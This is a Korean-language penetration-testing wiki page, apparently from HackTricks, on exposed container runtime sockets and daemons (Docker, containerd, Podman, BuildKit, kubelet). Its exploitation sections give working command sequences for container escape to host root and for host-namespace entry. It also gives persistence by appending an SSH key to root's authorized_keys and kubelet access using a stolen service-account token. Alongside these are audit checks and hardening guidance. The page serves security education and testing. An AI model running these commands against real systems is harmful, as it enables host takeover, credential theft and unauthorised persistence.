# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

실제 컨테이너 침해는 namespace escape에서 시작하지 않는 경우가 많습니다. runtime control plane에 접근할 수 있는 상황에서 시작됩니다. 워크로드가 마운트된 Unix socket이나 노출된 TCP listener를 통해 `dockerd`, `containerd`, CRI-O, Podman 또는 kubelet과 통신할 수 있다면, 공격자는 더 높은 권한으로 새 컨테이너를 만들거나, 호스트 파일시스템을 마운트하거나, 호스트 namespace에 합류하거나, 민감한 노드 정보를 가져올 수 있습니다. 이런 경우 runtime API가 실제 보안 경계이며, 이를 침해하는 것은 사실상 호스트를 침해하는 것과 같습니다.

따라서 runtime socket 노출은 커널 보호와 별도로 기록해야 합니다. 일반적인 seccomp, capabilities, MAC 제한이 적용된 컨테이너도 `/var/run/docker.sock` 또는 `/run/containerd/containerd.sock`이 내부에 마운트되어 있으면 API 호출 한 번으로 호스트가 침해될 수 있습니다. 현재 컨테이너의 커널 격리가 설계대로 정확히 작동하고 있어도 runtime 관리 plane은 완전히 노출되어 있을 수 있습니다.

## Daemon Access Models

Docker Engine은 전통적으로 로컬 Unix socket인 `unix:///var/run/docker.sock`을 통해 권한이 높은 API를 노출합니다. 과거에는 `tcp://0.0.0.0:2375`와 같은 TCP listener나 TLS로 보호되는 `2376` listener를 통해 원격으로도 노출되었습니다. 강력한 TLS와 클라이언트 인증 없이 daemon을 원격으로 노출하면 Docker API가 사실상 원격 root 인터페이스가 됩니다.

containerd, CRI-O, Podman, kubelet도 유사한 영향력이 큰 공격 표면을 노출합니다. 이름과 워크플로는 다르지만 원리는 같습니다. 인터페이스를 통해 호출자가 워크로드를 생성하거나, 호스트 경로를 마운트하거나, 자격 증명을 가져오거나, 실행 중인 컨테이너를 변경할 수 있다면, 그 인터페이스는 권한이 높은 관리 채널이므로 그에 맞게 다뤄야 합니다.

컨테이너 관리 웹 UI도 로컬 계정에 직접 socket 접근 권한을 주지 않고 같은 경계를 노출할 수 있습니다. 예를 들어, [Portainer issue #493](https://github.com/portainer/portainer/issues/493)에서는 오래된 1.11.1 빌드에서 인증되지 않은 관리자 암호 재설정이 가능하다고 기록했습니다. 로컬에서 접근할 수 있는 UI는 검토의 단서로만 취급하세요. 설치된 빌드와 인증 동작, 실제 관리자 제어 권한, 그리고 관리 대상 endpoint에서 쓰기 가능한 host bind mount를 사용해 컨테이너를 만들 수 있는지 확인하세요. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket)에 따르면 socket 기반 관리를 사용하려면 Docker socket에 접근할 수 있어야 합니다. rootless endpoint나 제한된 endpoint라면 호스트에 미치는 영향이 달라집니다. 프로세스 이름, 포트 또는 버전 문자열만으로 인증 취약점이나 호스트 root 접근이 가능하다고 단정하지 마세요.

확인해 볼 만한 일반적인 로컬 경로는 다음과 같습니다:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

오래되었거나 더 특수한 스택에서는 `dockershim.sock`, `frakti.sock`, `rktlet.sock` 같은 endpoint도 노출될 수 있습니다. 이러한 endpoint는 최신 환경에서는 흔하지 않지만, 일반 애플리케이션 소켓이 아니라 runtime 제어 인터페이스이므로 발견하면 동일한 주의를 기울여야 합니다.

## Secure Remote Access

daemon을 로컬 소켓 외부에 노출해야 한다면 TLS로 연결을 보호하고, 가급적 상호 인증을 적용해 daemon과 클라이언트가 서로를 검증하도록 해야 합니다. 편의를 위해 Docker daemon을 일반 HTTP로 여는 오래된 관행은 컨테이너 관리에서 가장 위험한 실수 중 하나입니다. API 표면이 충분히 강력해 권한이 높은 컨테이너를 직접 생성할 수 있기 때문입니다.

과거 Docker 설정 패턴은 다음과 같았습니다:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

systemd 기반 호스트에서 데몬 통신은 `fd://`로 나타날 수도 있습니다. 이는 데몬이 직접 socket을 바인딩하는 대신 systemd에서 미리 연 socket을 상속한다는 뜻입니다. 중요한 점은 정확한 구문이 아니라 보안상 결과입니다. 데몬이 엄격한 권한으로 제한된 로컬 socket을 벗어나 수신 대기하는 순간, 전송 보안과 클라이언트 인증은 선택적인 보안 강화가 아니라 필수 요소가 됩니다.

## 악용

런타임 socket이 있으면 어떤 socket인지, 호환되는 클라이언트가 있는지, raw HTTP 또는 gRPC로 접근할 수 있는지 확인합니다.

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

이 명령은 경로가 끊겼는지, 소켓은 마운트되어 있지만 접근할 수 없는지, 아니면 권한이 높은 API가 활성 상태인지 구분하는 데 유용합니다. 클라이언트 명령이 성공하면, 다음으로 확인할 점은 API를 통해 호스트 bind mount 또는 호스트 namespace 공유를 사용해 새 컨테이너를 실행할 수 있는지 여부입니다.

### 클라이언트가 설치되어 있지 않은 경우

`docker`, `podman` 또는 그 밖의 편리한 CLI가 없다고 해서 소켓이 안전한 것은 아닙니다. Docker Engine은 Unix 소켓을 통해 HTTP를 사용하고, Podman은 `podman system service`를 통해 Docker 호환 API와 Libpod 네이티브 API를 모두 제공합니다. 따라서 `curl`만 있는 최소한의 환경으로도 daemon을 제어할 수 있습니다:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

이는 post-exploitation 단계에서 중요합니다. 방어자가 일반적인 client binaries를 제거하면서도 management socket은 마운트된 상태로 두는 경우가 있기 때문입니다. Podman 호스트에서는 rootful과 rootless 배포 환경에 따라 중요한 경로가 다르다는 점을 기억하세요. rootful service 인스턴스는 `unix:///run/podman/podman.sock`, rootless 인스턴스는 `unix://$XDG_RUNTIME_DIR/podman/podman.sock`을 사용합니다.

### 전체 예제: Docker Socket에서 호스트 root로

`docker.sock`에 접근할 수 있다면, 일반적인 탈출 방법은 호스트의 root 파일 시스템을 마운트하는 새 컨테이너를 시작한 다음 그 안에서 `chroot`를 실행하는 것입니다:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

이는 Docker daemon을 통해 호스트에서 직접 root 권한으로 명령을 실행할 수 있게 합니다. 영향은 파일 읽기에만 국한되지 않습니다. 새 컨테이너에 들어간 공격자는 호스트 파일을 변경하고, 자격 증명을 수집하고, persistence를 심거나, 추가 권한 있는 워크로드를 시작할 수 있습니다.

### 전체 예시: Docker Socket에서 호스트 네임스페이스로

공격자가 파일 시스템에만 접근하는 대신 네임스페이스 진입을 원한다면:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

이 경로는 현재 컨테이너를 악용하는 대신, runtime에 host namespace가 명시적으로 노출된 새 컨테이너를 만들도록 요청해 host에 도달합니다.

### Docker Socket Persistence Pattern

runtime 제어는 일회성 shell 대신 persistence에도 사용할 수 있습니다. 일반적인 패턴은 host mount가 있는 helper container를 만들고, 마운트된 host filesystem에 승인된 접근 자료나 startup hook을 기록한 다음, host가 이를 사용하는지 확인하는 것입니다.

예시 형태:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

같은 방식으로 systemd 유닛, cron 조각, 애플리케이션 시작 파일 또는 SSH 키를 대상으로 삼을 수 있으며, 무엇을 입증하려는지에 따라 달라집니다. 중요한 점은 영구적인 변경이 원래 컨테이너의 추가 권한이 아니라 runtime daemon의 호스트 수준 파일시스템 권한을 통해 이루어진다는 것입니다.

### Raw Docker API Helper Pivot

Docker CLI가 없는 경우, Unix 소켓을 통한 HTTP로 동일한 호스트 마운트 helper 흐름을 실행할 수 있습니다. 일반적인 흐름은 API를 확인하고, 호스트 bind mount가 있는 helper 컨테이너를 만들고, 이를 시작한 다음, exec 인스턴스를 만들고 시작하는 것입니다.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

최종 `/exec/<id>/start` 요청은 반환된 exec ID에 따라 달라지지만, 보안상의 핵심은 정확한 JSON 처리 방식과 무관합니다. rootful Docker daemon에 raw API로 접근할 수 있으면 더 강력한 helper workload를 요청할 수 있습니다.

### 전체 예시: containerd 소켓

마운트된 `containerd` 소켓도 대개 그만큼 위험합니다:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Docker와 더 유사한 클라이언트를 사용할 수 있다면, `nerdctl`은 `--privileged`, `--pid=host`, `-v`와 같은 익숙한 플래그를 제공하므로 `ctr`보다 더 편리할 수 있습니다:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

영향은 다시 호스트 장악입니다. Docker 전용 도구가 없더라도 다른 runtime API가 동일한 관리 권한을 제공할 수 있습니다. Kubernetes 노드에서는 `crictl`도 CRI endpoint에 직접 연결되므로 정찰과 컨테이너 상호작용에 충분할 수 있습니다.

### BuildKit Socket

사람들이 `buildkitd`를 흔히 "빌드 백엔드일 뿐"이라고 생각하기 때문에 간과하기 쉽지만, 이 데몬은 여전히 권한이 높은 control plane입니다. 접근 가능한 `buildkitd.sock`을 통해 공격자는 임의의 빌드 단계를 실행하고, worker 기능을 확인하고, 침해된 환경의 로컬 컨텍스트를 사용하고, 데몬에서 허용하도록 구성된 경우 `network.host` 또는 `security.insecure` 같은 위험한 entitlement를 요청할 수 있습니다.

처음에 유용한 상호작용은 다음과 같습니다:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

daemon이 build 요청을 수락한다면, insecure entitlements를 사용할 수 있는지 테스트합니다:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

정확한 영향은 daemon 구성에 따라 달라지지만, permissive entitlements가 설정된 rootful BuildKit 서비스는 무해한 개발자 편의 기능이 아닙니다. 특히 CI runner와 공유 build 노드에서는 또 하나의 고가치 관리 표면으로 취급하세요.

### TCP를 통한 Kubelet API

kubelet은 container runtime은 아니지만, 여전히 노드 관리 plane의 일부이며 신뢰 경계 논의에서 같은 범위로 다뤄지는 경우가 많습니다. kubelet의 secure port `10250`에 workload에서 접근할 수 있거나, 노드 자격 증명, kubeconfig 또는 proxy 권한이 노출된 경우, 공격자는 Kubernetes API server의 admission 경로를 전혀 거치지 않고도 Pod를 열거하거나 로그를 가져오거나 노드 로컬 컨테이너에서 명령을 실행할 수 있습니다.

먼저 간단한 탐색부터 시작하세요:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

kubelet 또는 API-server proxy 경로에서 `exec`를 허용하면, WebSocket을 지원하는 클라이언트가 이를 악용해 노드의 다른 컨테이너에서 코드를 실행할 수 있습니다. `get` 권한만 있는 `nodes/proxy`가 생각보다 위험한 이유도 여기에 있습니다. 요청이 명령을 실행하는 kubelet 엔드포인트에 도달할 수 있으며, 이러한 직접적인 kubelet 상호작용은 일반적인 Kubernetes 감사 로그에 기록되지 않습니다.<sup>[[2]](#references)</sup>

## 점검

이 점검의 목적은 컨테이너가 신뢰 경계 밖에 있어야 하는 관리 플레인에 접근할 수 있는지 확인하는 것입니다.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

여기서 흥미로운 점:

- 마운트된 runtime socket은 단순한 정보 공개가 아니라, 보통 직접적인 관리 권한을 제공합니다.
- TLS가 없는 `2375`의 TCP listener는 원격 침해 상태로 간주해야 합니다.
- `DOCKER_HOST`와 같은 환경 변수는 해당 워크로드가 호스트 runtime과 통신하도록 의도적으로 설계되었음을 드러내는 경우가 많습니다.

## Runtime 기본값

| Runtime / 플랫폼 | 기본 상태 | 기본 동작 | 흔히 수동으로 보안을 약화하는 방법 |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 로컬 Unix socket 사용 | `dockerd`는 로컬 socket에서 수신 대기하며, daemon은 보통 root 권한으로 실행됩니다 | `/var/run/docker.sock` 마운트, `tcp://...:2375` 노출, `2376`에서 취약하거나 누락된 TLS |
| Podman | 기본적으로 daemonless CLI 사용 | 일반적인 로컬 사용에는 장시간 실행되는 privileged daemon이 필요하지 않습니다. `podman system service`를 활성화하면 API socket이 노출될 수 있습니다 | `podman.sock` 노출, service를 광범위하게 실행, rootful API 사용 |
| containerd | 로컬 privileged socket 사용 | 관리 API는 로컬 socket을 통해 노출되며, 보통 상위 수준 도구에서 사용합니다 | `containerd.sock` 마운트, `ctr` 또는 `nerdctl`에 광범위한 접근 허용, privileged namespace 노출 |
| CRI-O | 로컬 privileged socket 사용 | CRI endpoint는 노드 로컬의 신뢰할 수 있는 구성 요소를 위한 것입니다 | `crio.sock` 마운트, 신뢰할 수 없는 워크로드에 CRI endpoint 노출 |
| Kubernetes kubelet | 노드 로컬 관리 API | kubelet은 Pod에서 광범위하게 접근할 수 없어야 합니다. 인증 및 권한 부여 설정에 따라 접근 시 Pod 상태, 자격 증명, 실행 기능이 노출될 수 있습니다 | kubelet socket 또는 인증서 마운트, 취약한 kubelet 인증, host networking과 접근 가능한 kubelet endpoint 조합 |

## References

- [1] [containerd socket 악용 파트 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server 우회 위험](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
